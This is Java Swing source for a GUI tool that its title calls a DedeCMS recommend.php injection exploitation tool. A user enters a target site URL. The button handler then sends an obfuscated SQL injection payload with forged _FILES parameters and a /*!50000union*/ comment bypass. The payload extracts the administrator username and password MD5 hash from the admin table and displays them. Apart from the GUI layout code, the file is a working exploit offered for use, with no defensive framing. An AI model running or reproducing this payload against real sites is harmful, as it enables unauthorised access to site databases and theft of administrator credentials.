//package org.javaweb.dede.ui;
  
import java.awt.Toolkit;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
  
public class MainFrame extends javax.swing.JFrame {
  
    private static final long serialVersionUID = 1L;
  
    /**
     * Creates new form MainFrame
     */
    public MainFrame() {
        initComponents();
    }
  
    public String request(String url){
        String str = "",tmp;
        try {
            BufferedReader br = new BufferedReader(new InputStreamReader(new URL(url).openStream()));
            while((tmp=br.readLine())!=null){
                str+=tmp+"\r\n";
            }
        } catch (Exception e) {
            jTextArea1.setText(e.toString());
        }
        return str;
    }
  
    private void initComponents() {
  
        jPanel1 = new javax.swing.JPanel();
        jLabel1 = new javax.swing.JLabel();
        jTextField1 = new javax.swing.JTextField();
        jButton1 = new javax.swing.JButton();
        jScrollPane1 = new javax.swing.JScrollPane();
        jTextArea1 = new javax.swing.JTextArea();
  
        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
  
        jLabel1.setText("URL:");
        jTextField1.setText("http://localhost");
  
        this.setTitle("DedeCms recommend.php注入利用工具-p2j.cn");
  
        int screenWidth = Toolkit.getDefaultToolkit().getScreenSize().width;
        int screenHeight = Toolkit.getDefaultToolkit().getScreenSize().height;
        this.setBounds(screenWidth / 2 - 229, screenHeight / 2 - 158, 458, 316);
  
        jButton1.setText("获取");
        jButton1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton1ActionPerformed(evt);
            }
        });
  
        jTextArea1.setColumns(20);
        jTextArea1.setRows(5);
        jScrollPane1.setViewportView(jTextArea1);
  
        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);
        jPanel1.setLayout(jPanel1Layout);
        jPanel1Layout.setHorizontalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel1Layout.createSequentialGroup()
                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false)
                    .addComponent(jScrollPane1, javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(javax.swing.GroupLayout.Alignment.LEADING, jPanel1Layout.createSequentialGroup()
                        .addContainerGap()
                        .addComponent(jLabel1)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jTextField1, javax.swing.GroupLayout.PREFERRED_SIZE, 331, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jButton1, javax.swing.GroupLayout.PREFERRED_SIZE, 83, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addGap(0, 0, Short.MAX_VALUE))
        );
        jPanel1Layout.setVerticalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel1Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel1)
                    .addComponent(jTextField1,
 javax.swing.GroupLayout.PREFERRED_SIZE, 
javax.swing.GroupLayout.DEFAULT_SIZE, 
javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jButton1))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 254, Short.MAX_VALUE))
        );
  
        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jPanel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jPanel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );
  
        pack();
    }// </editor-fold>                       
  
    private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {                                        
        String url = jTextField1.getText();
        if(null==url||"".equals(url)){
            return ;
        }
        String result = request(url+"/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\%27%20or%20mid=@`\\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294");
        Matcher m = Pattern.compile("<h2>(.*)</h2>").matcher(result);
        if(m.find()){
            String[] s = m.group(1).split("\\|");
            if(s.length>2){
                jTextArea1.setText("UserName:"+s[1]+"\r\nMD5:"+s[2].substring(3,s[2].length()-1));
            }
        }
    }                                       
  
    public static void main(String args[]) {
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new MainFrame().setVisible(true);
            }
        });
    }
  
    // Variables declaration - do not modify                    
    private javax.swing.JButton jButton1;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JPanel jPanel1;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JTextArea jTextArea1;
    private javax.swing.JTextField jTextField1;
    // End of variables declaration                  
}